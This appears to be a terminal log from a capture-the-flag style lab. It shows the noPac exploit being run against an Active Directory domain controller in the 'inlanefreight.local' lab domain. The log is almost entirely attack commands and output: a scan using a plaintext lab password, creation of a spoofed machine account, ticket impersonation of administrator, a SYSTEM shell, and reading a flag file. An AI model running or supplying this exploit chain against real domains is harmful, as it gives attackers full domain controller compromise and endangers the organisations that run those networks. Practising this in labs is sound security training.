```
$sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap  

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
                                        
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
┌─[htb-student@ea-attack01]─[/opt/noPac]
└──╼ $sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
                                        
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-GIF7E8OJGOC$"
[*] MachineAccount "WIN-GIF7E8OJGOC$" password = o8qwUZKUgS$z
[*] Successfully added machine account WIN-GIF7E8OJGOC$ with password o8qwUZKUgS$z.
[*] WIN-GIF7E8OJGOC$ object = CN=WIN-GIF7E8OJGOC,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] WIN-GIF7E8OJGOC$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-GIF7E8OJGOC$
[*] Restored WIN-GIF7E8OJGOC$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*]     Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Rename ccache with target ...
[*] Attempting to del a computer with the name: WIN-GIF7E8OJGOC$
[-] Delete computer WIN-GIF7E8OJGOC$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system                                                                                             
```

```
C:\Windows\system32>dir C:\Users\Administrator\Desktop\DailyTasks\flag.txt
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\Users\Administrator\Desktop\DailyTasks

03/23/2022  04:29 AM                17 flag.txt
               1 File(s)             17 bytes
               0 Dir(s)  18,270,208,000 bytes free

C:\Windows\system32>type C:\Users\Administrator\Desktop\DailyTasks\flag.txt

```